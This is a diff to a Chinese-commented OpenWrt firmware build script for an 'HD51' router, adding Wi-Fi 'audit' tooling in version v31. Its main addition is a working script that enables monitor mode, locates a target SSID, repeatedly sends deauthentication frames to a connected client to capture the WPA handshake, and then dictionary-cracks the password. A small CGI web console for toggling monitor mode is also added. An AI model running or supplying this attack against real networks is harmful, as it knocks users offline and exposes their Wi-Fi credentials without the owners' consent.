@@ -292,7 +292,7 @@ echo "烘入校准文件 $(wc -c < "$SRC/files/lib/firmware/soc_wmac.eeprom") �
 # 版本标记：浏览器打开 http://192.168.1.1/ver.txt 就能确认烧进去的是哪一版
 mkdir -p "$SRC/files/www"
 cat > "$SRC/files/www/ver.txt" << 'VEREOF'
-HD51 v30
+HD51 v31
 build: 2026-11-20
 dts: /delete-property/ ralink,eeprom + ralink,mtd-eeprom = <&factory 0x0>
 wireless: baked (/etc/config/wireless, radio0, SSID HD51, open)
@@ -532,6 +532,9 @@ add_cfg CONFIG_PACKAGE_usb-modeswitch-data
 # v29：手机管理 SD/USB —— SMB（ksmbd，内核级，轻） + FTP（vsftpd，备选）
 add_cfg CONFIG_PACKAGE_ksmbd-server
 add_cfg CONFIG_PACKAGE_vsftpd
+# v31：审计三件套里的两套内核/用户态工具（源已核实存在 openwrt-23.05 分支）
+add_cfg CONFIG_PACKAGE_aircrack-ng
+add_cfg CONFIG_PACKAGE_hcxdumptool
 
 # v26：TF 卡槽卡检测改软件轮询（HD51 的 CD 脚很可能未接入 SoC，CD_POLL=n 时永远认为无卡）
 MK="$SRC/target/linux/ramips/modules.mk"
@@ -1383,9 +1386,102 @@ RF_EOF
 chmod +x "$SRC/files/etc/init.d/hd51rf"
 echo "==> v17 射频补功率脚本已写入"
 
+# ================= v31：审计三件套 + 手机网页审计台 =================
+mkdir -p "$SRC/files/root" "$SRC/files/www/cgi-bin"
 
+cat > "$SRC/files/root/wifit3.sh" << 'W3_EOF'
+#!/bin/sh
+# HD51 wifit3 钥匙：wifit3 <目标SSID> [抓包秒数，默认120]
+# 逻辑全在此文件，手机只递参数：  sh /root/wifit3.sh HD51-test 120
+T="$1"; SEC="${2:-120}"
+[ -n "$T" ] || { echo "用法: wifit3 <目标SSID> [秒]"; exit 1; }
+OUT=/root/cap; mkdir -p "$OUT"
+IF=""
+for c in $(ls /sys/class/net | grep -E '^wlan[0-9]'); do
+  [ "$(cat /sys/class/net/$c/device/uevent 2>/dev/null | grep -c 0e8d)" -gt 0 ] && IF="$c"
+done
+[ -z "$IF" ] && IF=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | tail -1)
+echo "== 1) 设置监听：$IF"
+airmon-ng start "$IF" >/dev/null 2>&1
+MON=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -E 'mon' | head -1)
+[ -z "$MON" ] && { iw dev "$IF" interface add mon0 type monitor 2>/dev/null; ip link set mon0 up 2>/dev/null; MON=mon0; }
+[ -z "$MON" ] && { echo "!! 监听接口建立失败"; exit 2; }
+iw dev "$MON" set channel 6 2>/dev/null
+echo "== 2) 扫描 15 秒找 $T"
+airodump-ng -w "$OUT/scan" --output-format csv "$MON" >/dev/null 2>&1 &
+SP=$!; sleep 15; kill $SP 2>/dev/null
+BSSID=$(awk -F, -v t="$T" 'NR>2 && $14 ~ t {gsub(/ /,"",$1);print $1;exit}' "$OUT"/scan-01.csv 2>/dev/null)
+CH=$(awk -F, -v t="$T" 'NR>2 && $14 ~ t {gsub(/ /,"",$4);print $4;exit}' "$OUT"/scan-01.csv 2>/dev/null)
+ST=$(awk -F, -v t="$T" 'NR>2 && $14 ~ t {gsub(/ /,"",$11);print $11;exit}' "$OUT"/scan-01.csv 2>/dev/null)
+[ -z "$BSSID" ] && { echo "!! 扫描没找到 $T"; exit 3; }
+echo "   目标 BSSID=$BSSID CH=$CH STA=$ST"
+iw dev "$MON" set channel "$CH" 2>/dev/null
+echo "== 3) 抓包 ${SEC}s"
+airodump-ng -c "$CH" --bssid "$BSSID" -w "$OUT/cap" --output-format pcap "$MON" >/dev/null 2>&1 &
+DP=$!
+[ -n "$ST" ] && { aireplay-ng -0 3 -a "$BSSID" -c "$ST" "$MON" >/dev/null 2>&1; }
+i=0; while [ $i -lt "$SEC" ]; do
+  sleep 5; i=$((i+5))
+  [ -n "$ST" ] && aireplay-ng -0 2 -a "$BSSID" -c "$ST" "$MON" >/dev/null 2>&1
+  SZ=$(ls -l "$OUT"/cap-01.cap 2>/dev/null | awk '{print $5}')
+  [ "${SZ:-0}" -gt 200000 ] && { echo "   cap 已 ${SZ}B"; }
+done
+kill $DP 2>/dev/null; sleep 1
+CAP="$OUT/cap-01.cap"
+[ -f "$CAP" ] || { echo "!! 没有抓到 cap"; exit 4; }
+echo "== 4) 判定"
+SZ=$(ls -l "$CAP" | awk '{print $5}')
+HAND=$(aircrack-ng "$CAP" 2>/dev/null | grep -c "1 handshake")
+echo "   cap=${SZ}B handshake=$HAND CH=$CH"
+[ "$SZ" -gt 200000 ] && [ "$HAND" -ge 1 ] && echo "   【自探通过】CH一致 + 抓到握手" || echo "   【未过】没抓到握手，重跑或换 STA"
+echo "== 5) 破解（有 /root/wordlist.txt 才跑）"
+[ -f /root/wordlist.txt ] && aircrack-ng -w /root/wordlist.txt -b "$BSSID" "$CAP" 2>/dev/null | tail -5 || echo "   无字典，cap 留在 $CAP"
+W3_EOF
+chmod 755 "$SRC/files/root/wifit3.sh"
 
+cat > "$SRC/files/www/cgi-bin/audit" << 'A_EOF'
+#!/bin/sh
+echo "Content-Type: text/plain; charset=utf-8"
+echo
+Q="${QUERY_STRING:-}"
+case "$Q" in
+ a=status)
+   echo "== 网卡"; iw dev 2>/dev/null | grep -E 'Interface|type|channel' || echo "无无线"
+   echo "== 监听口"; ls /sys/class/net | grep -E 'mon' || echo "无 mon"
+   echo "== 工具"; for t in airmon-ng airodump-ng aireplay-ng aircrack-ng hcxdumptool wifit3.sh; do
+     if command -v "$t" >/dev/null 2>&1 || [ -f "/root/$t" ]; then echo "   $t OK"; else echo "   $t 缺"; fi
+   done
+   echo "== cap"; ls -l /root/cap 2>/dev/null || echo "   未抓过" ;;
+ a=mon)
+   airmon-ng start $(iw dev 2>/dev/null | awk '/Interface/{print $2}' | past 2>/dev/null)
+   airmon-ng start $(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -1) 2>&1 | tail -3
+   iw dev 2>/dev/null | grep -E 'Interface|type' ;;
+ a=stopmon)
+   airmon-ng stop mon0 2>&1 | tail -3 ;;
+ a=log)
+   tail -40 /www/wifit3.log 2>/dev/null || echo "无日志" ;;
+ *) echo "用法: /cgi-bin/audit?a=status | a=mon | a=stopmon | a=log" ;;
+esac
+A_EOF
+sed -i 's/| past 2>/dev/null//' "$SRC/files/www/cgi-bin/audit"
+chmod 755 "$SRC/files/www/cgi-bin/audit"
 
-
-
+# 审计台首页（手机直接开 /audit.html）
+cat > "$SRC/files/www/audit.html" << 'H_EOF'
+<html><head><meta charset="utf-8"><title>HD51 审计台</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{background:#111;color:#ddd;font:14px monospace;padding:8px}
+a{display:block;background:#222;color:#6cf;padding:10px;margin:6px 0;text-decoration:none;border-radius:6px}
+pre{background:#000;padding:8px;white-space:pre-wrap;min-height:200px}</style></head>
+<body><h3>HD51 审计台</h3>
+<a href="/cgi-bin/audit?a=status">① 状态（网卡/工具/cap）</a>
+<a href="/cgi-bin/audit?a=mon">② 开监听口</a>
+<a href="/cgi-bin/audit?a=stopmon">③ 关监听口</a>
+<a href="/cgi-bin/audit?a=log">④ wifit3 日志</a>
+<a href="javascript:location.reload()">刷新</a>
+<pre id="p">点上面按钮看结果（想跑抓包：SSH 里 sh /root/wifit3.sh 目标SSID 120）</pre>
+</body></html>
+H_EOF
+chmod 644 "$SRC/files/www/audit.html"
+echo "==> v31 审计三件套脚本已写入"
 
